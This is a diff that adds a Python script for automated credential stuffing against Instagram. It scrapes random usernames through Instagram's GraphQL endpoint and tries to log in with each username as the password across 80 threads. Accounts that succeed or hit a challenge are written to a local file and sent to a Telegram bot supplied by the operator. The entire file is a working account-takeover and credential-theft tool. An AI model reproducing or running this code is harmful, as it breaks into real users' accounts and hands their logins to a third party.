@@ -1,0 +1,133 @@
+import requests, os, json, random, string, threading
+from uuid import uuid4
+from colorama import Fore, init
+from datetime import datetime
+import webbrowser
+webbrowser.open("https://t.me/+BY77d5dVZkozZGQ1")
+import getpass
+import sys
+
+correct_password = "rahasya123"
+
+entered_password = getpass.getpass("🔒 Enter password to access this tool: ")
+
+if entered_password != correct_password:
+    print("❌ Incorrect password! Exiting...")
+    sys.exit()
+
+print("✅ Access granted!")
+
+expiry_date = datetime(2080, 7, 9)
+
+current_date = datetime.now()
+
+if current_date > expiry_date:
+    print("❌ This script has expired. Please contact the developer.")
+    exit()
+
+print("✅ Script is running... (𝐇𝐢𝐭𝐬 𝐤𝐞 𝐬𝐬 𝐝𝐞 𝐝𝐞𝐧𝐚 𝐜𝐡𝐮𝐭𝐢𝐲𝐞..)")
+
+init(autoreset=True)
+uid = str(uuid4())
+
+stats = {
+    'success': 0,
+    'challenge': 0,
+    'fail': 0,
+    'retry': 0,
+    'total': 0
+}
+
+BOT_TOKEN = input("Enter your Telegram Bot Token: ")
+CHAT_ID = input("Enter your Telegram Chat ID: ")
+
+def send_telegram(message):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {'chat_id': CHAT_ID, 'text': message}
+        requests.post(url, data=payload)
+    except Exception as e:
+        print(f"Telegram send error: {e}")
+
+def log_status():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f"{Fore.YELLOW}Issues: {stats['success']} "
+          f"{Fore.GREEN}Hits: {stats['challenge']} "
+          f"{Fore.RED}Fails: {stats['fail']} "
+          f"{Fore.CYAN}Retries: {stats['retry']}")
+
+def check_login(username, password):
+    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+    headers = {
+        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
+    }
+    data = {
+        'uuid': uid,
+        'password': password,
+        'username': username,
+        'device_id': uid,
+        'from_reg': 'false',
+        '_csrftoken': 'missing',
+        'login_attempt_countn': '0'
+    }
+
+    try:
+        res = requests.post(url, headers=headers, data=data, timeout=15)
+        content = res.text
+
+        if '"logged_in_user"' in content:
+            stats['success'] += 1
+            with open('rahasya.txt', 'a') as f:
+                f.write(f'{username}:{password}\n')
+            send_telegram(f"✅ Login Successful!\n👤 {username}\n🔐 {password}")
+
+        elif '"challenge_required"' in content:
+            stats['challenge'] += 1
+            with open('rahasya.txt', 'a') as f:
+                f.write(f'{username}:{password}\n')
+            send_telegram(f"⚠️ GOT A HIT!!!\n👤 {username}\n🔐 {password}")
+
+        else:
+            stats['fail'] += 1
+
+    except Exception as e:
+        stats['retry'] += 1
+        print(f"Error: {e}")
+    finally:
+        log_status()
+
+def fetch_users_and_check():
+    try:
+        lsd = ''.join(random.choices(string.digits, k=4))
+        user_id = str(random.randint(100000, 17750001))
+        variables = json.dumps({'id': user_id, 'render_surface': 'PROFILE'})
+
+        headers = {'X-FB-LSD': lsd}
+        payload = {
+            'lsd': lsd,
+            'variables': variables,
+            'doc_id': '25618261841150840'
+        }
+
+        resp = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=payload, timeout=15)
+        username = resp.json()['data']['user']['username']
+        with open('rahasya.txt', 'a') as f:
+            f.write(f"{username}:{username}\n")
+        check_login(username, username)
+
+    except:
+        pass
+
+def thread_worker():
+    for _ in range(1000):
+        fetch_users_and_check()
+
+threads = []
+for _ in range(80):
+    t = threading.Thread(target=thread_worker)
+    t.start()
+    threads.append(t)
+
+for t in threads:
+    t.join()
+
